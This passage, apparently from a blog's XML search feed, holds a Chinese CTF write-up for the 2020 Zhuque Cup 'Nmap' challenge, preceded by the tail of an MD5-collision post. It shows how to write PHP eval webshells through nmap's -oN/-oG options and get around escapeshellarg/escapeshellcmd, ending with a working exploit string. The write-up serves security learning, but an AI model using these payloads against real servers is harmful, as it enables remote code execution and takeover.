<p>终端输入<code>python .\MD5碰撞.py &quot;123&quot; 0</code><br><img src="/./../images/2/2-10.png" alt="image.png"><br>实践试一下：<br><img src="/./../images/2/2-11.png" alt="image.png"><br><code>注意点：跑出来的123后面第一个字符要是字母，如果不是多跑几次，概率还是挺大的。</code></p>
<p><a name="D6C2L"></a></p>
<h3 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h3><p>还有关于双md5的题目等等，只要掌握了这些思想，看到题目就能想到解法了。这个脚本也是面向百度编程找到的，有一个脚本能跑是比较好的，可以应对各种新情况。使用python脚本是因为有多线程模式，速度更快。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>2020年朱雀杯-Nmap</title>
    <url>/2022/08/24/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84%5DNmap%20wp/</url>
    <content><![CDATA[<h2 id="深层次剖析！！！"><a href="#深层次剖析！！！" class="headerlink" title="深层次剖析！！！"></a>深层次剖析！！！</h2><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>[2020年朱雀杯]</strong> 和 <strong>[BUUCTF 2018]Online Tool</strong>的题目似乎是一样的，不同在于朱雀杯没有给出源码，主要考察的都是<strong>nmap一句话木马写入</strong>。本篇文章细致讲解输入时<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong> 两个函数所进行的步骤。</p>
<h2 id="知识巩固"><a href="#知识巩固" class="headerlink" title="知识巩固"></a>知识巩固</h2><p>关于nmap的输出命令：<br>翻阅nmap中文手册，发现主要只有四种：</p>
<ul>
<li>-oN &lt; filespec &gt; (标准输出)</li>
<li>-oX &lt; filespec&gt;  (XML输出)   </li>
<li>-oS &lt; filespec&gt; (ScRipT KIdd|3 oUTpuT)   </li>
<li>-oG &lt; filespec&gt; (Grep输出)<span id="more"></span></li>
</ul>
<p>其中主要就是 <strong>-oN</strong> 和 <strong>-oG</strong> 为主，我们看一下他们的区别：（本地测试一下）<br><img src="https://img-blog.csdnimg.cn/588acbd1f44b4b0a893de95ec3d63ed8.png" alt="点我可以放大哦"><br>不难发现两件事：</p>
<ol>
<li>我们可以构造任意文件内容</li>
<li>文件的名字，<strong>包括后缀</strong>也是我们自己定义</li>
</ol>
<p> 接下来我们来研究一个有意思的东西：<br> 如果使用nmap写入一句话木马不用引号包起来会怎么样：<img src="https://img-blog.csdnimg.cn/566a0f0f33aa462d890f370342c48491.png" alt="点我可以放大哦"><br> 直接输入的话是无法生成文件的，必须给<?= @ eval($_REQUEST[1]);?>引号包起来才能正确执行命令，除此之外还有什么办法能执行呢。</p>
<p>！！ <em><strong>\转义</strong></em> ！！<br>！！ <em><strong>\转义</strong></em> ！！<br>！！ <em><strong>\转义</strong></em> ！！</p>
<p><img src="https://img-blog.csdnimg.cn/1ea9296240844d17a9793414b7e3b216.png" alt="点我可以放大哦"><br>把这些会引起歧义的符号全部转义就能执行命令，并且将木马生成在php文件中。这将对绕过 escapeshellarg 和 escapeshellcmd 很有用</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>进入页面，先输入<strong>127.0.0.1</strong>看一下会怎么样<br><img src="https://img-blog.csdnimg.cn/cd02b149cba94d789e7d0163b691f6e1.png" alt="点我可以放大哦"></p>
<p>发现结果和我们本地非常相似：<br><img src="https://img-blog.csdnimg.cn/05fbc74f4f4b42aba269d021bf05bca4.png" alt="点我可以放大哦"><br>再尝试一下命令：</p>
<blockquote>
<p>127.0.0.1 | ls</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/f4f028a8374e4ddcab71596dcb58aa2c.png" alt="点我可以放大哦"></p>
<p>可以看到本地是可以执行的，那我们试一下题目环境<br><img src="https://img-blog.csdnimg.cn/0872a3806bf741f58f89c299af601aaa.png" alt="点我可以放大哦"><br>发现被转义了<br></br><br></br><br>只能另辟蹊径，我们直接试着写入一句话木马</p>
<p><code> &#39;&lt;?php eval($_GET[1])?&gt;&#39; -oN 1.php</code></p>
<p><img src="https://img-blog.csdnimg.cn/a6fefabb78a245a78c76a63ad2148f1a.png" alt="点我可以放大哦"><br>结果发现回显是Hacker，可能把php过滤了</p>
<h3 id="过滤php怎么办"><a href="#过滤php怎么办" class="headerlink" title="过滤php怎么办"></a>过滤php怎么办</h3><blockquote>
<p>1.在一句话木马中的解决办法<br> </br><br> </br><br>利用短标签：<?=eval($_GET[1])?></p>
</blockquote>
<blockquote>
<p>后缀为php的解决办法<br></br><br></br><br>后缀改为phtml，也会解析成php文件</p>
</blockquote>
<p>接下来再试着写入一句话木马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])<span class="meta">?&gt;</span> -oN <span class="number">1</span>.phtml</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/896e6b725a334c98959897ba77307385.png" alt="点我可以放大哦"><br>回显是这个，但是我们访问1.phtml，发现并没有生成，是函数<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong>在作怪。</p>
<h3 id="如何绕过escapeshellarg和escapeshellcmd"><a href="#如何绕过escapeshellarg和escapeshellcmd" class="headerlink" title="如何绕过escapeshellarg和escapeshellcmd"></a>如何绕过<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong></h3><p>要了解如何绕过，那就得先了解一下这两个函数的分别作用<br><img src="https://img-blog.csdnimg.cn/6f1936ae35ee45b891089e6bdcb31597.png" alt="点我可以放大哦"></p>
<p><img src="https://img-blog.csdnimg.cn/a91c3e1a83e84661ac884f52b80214c9.png" alt="点我可以放大哦"><br>看了描述之后再看一下这两个函数的例子：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;&#x27; &lt;?= @eval(\$_REQUEST[1]);?&gt; -oG test.phtml &#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;escapeshellarg:&quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$a</span>).<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;escapeshellcmd:&quot;</span>.<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$a</span>).<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>输出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">escapeshellarg:<span class="string">&#x27;&#x27;</span>\\<span class="string">&#x27;&#x27;</span><span class="meta">&lt;?=</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span> -oG test.phtml<span class="string">&#x27;\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">escapeshellcmd:<span class="string">&#x27;&#x27;</span>\\\\<span class="string">&#x27;&#x27;</span>\&lt;\\?= @<span class="keyword">eval</span>\\(\\<span class="variable">$_REQUEST</span>\\[<span class="number">1</span>\\]\\)\\;\\?\\&gt; -oG test.phtml<span class="string">&#x27;\\\\&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果我们把两个函数处理过的字符串直接用nmap尝试写入文件能成功吗<br><img src="https://img-blog.csdnimg.cn/e6272a79439847e0a0f6d21513b9522f.png" alt="点我可以放大哦"><br>很显然，答案是可行的如此一来便绕过了<strong>escapeshellarg</strong>和<strong>escapeshellcmd</strong></p>
<p>接下来就是连接木马巴拉巴拉<br><img src="https://img-blog.csdnimg.cn/80ecfef12a42466780ba008f01e3ba80.png" alt="点我可以放大哦"></p>
<h2 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h2><p>exp：</p>
<p><code> &#39; &lt;?= @eval($_REQUEST[1]);?&gt; -oG test.phtml &#39;</code></p>
<p>这个<strong>引号</strong>和 <strong>&lt;</strong> 之间要记得留空格，否则 <strong>&lt;</strong> 会被转义，一句话木马就失效了</p>
<h2 id="尾言"><a href="#尾言" class="headerlink" title="尾言"></a>尾言</h2><p>本来其实是不知道对 <strong>[</strong> <strong>]</strong> <strong>?</strong> 等符号也进行转义之后因为 nmap 写入文件恰好需要那些转义才刚好写进去。自己研究了这么久才意外发现也是很惊喜，之前对namp不甚了解的时候做过[2018BUUCTF]类似的题型，没有完全了解，今天<strong>查阅很多资料+实践</strong>才发现这些奥秘的，希望对你也有帮助。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a> &#x3D;&gt; PHP escapeshellarg()+escapeshellcmd() 之殇</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Tools</category>
      </categories>
  </entry>
</search>
